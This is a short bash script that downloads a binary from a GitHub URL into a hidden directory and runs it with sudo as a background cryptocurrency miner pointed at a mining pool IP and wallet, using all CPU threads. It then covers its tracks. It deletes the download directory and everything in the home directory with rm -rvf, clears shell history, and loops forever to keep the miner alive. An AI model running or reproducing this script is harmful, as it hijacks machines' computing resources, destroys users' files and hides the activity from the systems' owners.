#!/bin/bash
set -x
apt-get update ; apt-get install -y wget curl sudo
mkdir .lib && cd .lib
wget -O sgr1 https://github.com/Sonehra/All-File/raw/main/sereb > /dev/null 2>&1
chmod u+x sgr1
sudo ./sgr1 --algorithm aurum --pool 128.199.218.20:80 --wallet bit1qy594zk9ed7ds894gchkq4cm3gcmqflt2zjpepg.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
sleep 30
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
